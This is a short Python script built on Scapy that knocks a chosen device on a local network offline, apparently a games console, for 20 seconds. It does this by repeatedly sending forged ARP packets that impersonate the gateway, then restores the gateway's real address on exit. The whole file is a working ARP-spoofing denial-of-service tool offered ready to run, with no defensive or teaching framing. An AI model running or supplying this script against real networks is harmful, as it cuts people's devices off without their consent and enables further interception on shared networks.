#!/usr/bin/env python3

import scapy.all as net
import time, math

import sys, os
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
import get_machines
import atexit

VERBOSITY = 0
TIME_OFFLINE = 20 #seconds
BAR_LENGTH = 10

import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--gateway_ip")
parser.add_argument("--target_ip")
parser.add_argument("--target_mac")
args = parser.parse_args()

print("Finding network devices ", end="", flush=True)
machines = get_machines.search(
	ps4=True,
	gateway_ip=args.gateway_ip,
	target_ip=args.target_ip,
	mac_startswith=args.target_mac
)

#ensure that it can be cancelled
def restoreARP():
	print("\rRestoring ARP   %s" % (" " * BAR_LENGTH))
	net.send(net.ARP(op="who-has", hwdst="ff:ff:ff:ff:ff:ff", pdst=machines["target"].ip, hwsrc=machines["gateway"].mac, psrc=machines["gateway"].ip), verbose=VERBOSITY)
atexit.register(restoreARP)

print("\r                        ", end="\r")
time_started = time.time()

try:
	while True:
		delta = int(time.time() - time_started)
		if delta >= TIME_OFFLINE:
			break

		#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
		net.send(net.ARP(op="who-has", hwdst=machines["target"].mac, pdst=machines["target"].ip, psrc=machines["gateway"].ip), verbose=VERBOSITY)

		bar = "=" * int(delta / TIME_OFFLINE * BAR_LENGTH)
		space = " " * (BAR_LENGTH - len(bar))
		print("\r[%s%s] %ds left " % (bar, space, TIME_OFFLINE - delta), end="")
		time.sleep(1)
	print("\rDone            %s" % (" " * BAR_LENGTH), end="") #clear the line

except KeyboardInterrupt:
	pass
